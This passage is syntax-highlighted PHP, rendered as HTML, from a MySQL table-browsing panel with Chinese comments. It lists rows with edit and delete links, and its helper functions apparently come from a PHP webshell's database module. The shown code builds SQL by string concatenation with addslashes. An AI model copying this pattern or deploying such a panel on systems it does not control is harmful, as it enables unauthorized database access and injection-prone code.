<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">row</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_assoc(</span>$<span style="color: #ffcc66;">getfield</span>)) <span style="text-decoration: underline;">{</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span>[$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>]][<span style="color: #66cccc;">'Key'</span>] = $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Key</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span>[$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>]][<span style="color: #66cccc;">'Extra'</span>] = $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'E</span><span style="color: #66cccc; text-decoration: underline;">xtra'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Key'</span>] == <span style="color: #66cccc;">'UNI'</span> || $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Key'</span>] <span style="text-decoration: underline;">== </span><span style="color: #66cccc; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">keyfied</span> = $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">/*********************</span><span style="color: #999999; font-style: italic;">/</span><span style="color: #f2777a; background-color: #515151;">                     </span><span style="color: #f2777a; background-color: #515151; text-decoration: underline;">            </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">keyfied</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">strtolower(substr(</span>$<span style="color: #ffcc66;">query</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0</span>,<span style="color: #cccccc; background-color: #2d2d2d;">1</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">3</span><span style="text-decoration: underline;">)) == </span><span style="color: #66cccc; text-decoration: underline;">'select * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">query</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">" LIMIT "</span>, <span style="color: #66cccc;">" order </span><span style="color: #66cccc; text-decoration: underline;">by $keyfied DESC LIMIT "</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">query</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span>$<span style="color: #ffcc66;">query</span>);

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">multipage</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;table border="0" cellpadding="3" cellspa</span><span style="color: #66cccc; text-decoration: underline;">cing="0"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">allowedit</span>) <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fieldnum</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_num_fields(</span>$<span style="color: #ffcc66;">result</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">i</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;$<span style="color: #ffcc66;">i</span>&lt;$<span style="color: #ffcc66;">fieldnum</span>;$<span style="color: #ffcc66;">i</span>++){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">name</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_field_name(</span>$<span style="color: #ffcc66;">result</span>, $<span style="color: #ffcc66;">i</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">type</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_field_type(</span>$<span style="color: #ffcc66;">result</span>, $<span style="color: #ffcc66;">i</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">len</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_field_len(</span>$<span style="color: #ffcc66;">result</span>, $<span style="color: #ffcc66;">i</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #66cccc; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #66cccc; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #66cccc; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">mn</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_assoc(</span>$<span style="color: #ffcc66;">result</span>)){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="</span><span style="color: #66cccc; text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> = $<span style="color: #ffcc66;">tmp</span> = $<span style="color: #ffcc66;">b1</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">mn</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span>=&gt;$<span style="color: #ffcc66;">inside</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">inside</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;</span><span style="color: #999999; font-style: italic; text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">rowdb</span>[$<span style="color: #ffcc66;">key</span>][<span style="color: #66cccc;">'Key'</span>] == <span style="color: #66cccc;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffcc66; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #66cccc; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> = $<span style="color: #ffcc66;">key</span>.<span style="color: #66cccc;">"='"</span>.<span style="color: #cccccc; background-color: #2d2d2d;">addslashe</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">s(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">break</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> .= $<span style="color: #ffcc66;">tmp</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">key</span>.<span style="color: #66cccc;">"='"</span>.<span style="color: #cccccc; background-color: #2d2d2d;">addslas</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">hes(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tmp</span> = <span style="color: #66cccc;">' AND '</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">mn</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span>=&gt;$<span style="color: #ffcc66;">inside</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">b1</span> .= <span style="color: #66cccc;">'&lt;td nowrap&gt;'</span>.<span style="color: #cccccc; background-color: #2d2d2d;">html_clean(</span>$<span style="color: #ffcc66;">ins</span><span style="color: #ffcc66; text-decoration: underline;">ide</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> = <span style="color: #cccccc; background-color: #2d2d2d;">base64_encode(</span>$<span style="color: #ffcc66;">where</span>);

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">allowedit</span>) <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;&lt;a href="j</span><span style="color: #66cccc; text-decoration: underline;">avascript:editrecord(\'edit\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span><span 